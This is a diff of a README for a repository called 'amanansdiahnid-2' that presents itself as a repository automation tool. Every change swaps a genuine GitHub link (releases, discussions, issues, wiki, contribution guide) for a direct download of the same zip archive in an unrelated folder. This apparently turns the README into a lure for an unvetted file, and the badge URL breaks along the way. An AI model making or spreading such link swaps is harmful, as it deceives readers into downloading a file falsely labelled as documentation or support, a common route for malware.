@@ -1,6 +1,6 @@
 # 🌟 amanansdiahnid-2 - Effortless Automation for Your Repository
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/RafiArfan/amanansdiahnid-2/releases)
+[![Download](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **amanansdiahnid-2**! This application helps you automate tasks in yo
 
 To begin using **amanansdiahnid-2**, visit the Releases page to download the latest version of the application.
 
-[Visit this page to download](https://github.com/RafiArfan/amanansdiahnid-2/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
 
 1. Click the link above to go to our Releases page.
 2. Find the latest release.
@@ -73,8 +73,8 @@ If problems persist, consider reaching out for support through the GitHub reposi
 
 Join our community for help, tips, and updates:
 
-- [GitHub Discussions](https://github.com/RafiArfan/amanansdiahnid-2/discussions)
-- [Issues Page](https://github.com/RafiArfan/amanansdiahnid-2/issues)
+- [GitHub Discussions](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
+- [Issues Page](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
 
 Feel free to ask questions or share your ideas!
 
@@ -82,11 +82,11 @@ Feel free to ask questions or share your ideas!
 
 For more information, check out the following resources:
 
-- [Documentation](https://github.com/RafiArfan/amanansdiahnid-2/wiki)
-- [Contribution Guidelines](https://github.com/RafiArfan/amanansdiahnid-2/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
 
 ## 🎉 Thank You for Using amanansdiahnid-2
 
 We appreciate your interest in **amanansdiahnid-2**. Your support allows us to continue improving the application and providing updates. Happy automating! 
 
-[Visit this page to download](https://github.com/RafiArfan/amanansdiahnid-2/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RafiArfan/amanansdiahnid-2/main/philomathy/amanansdiahnid-2.zip)
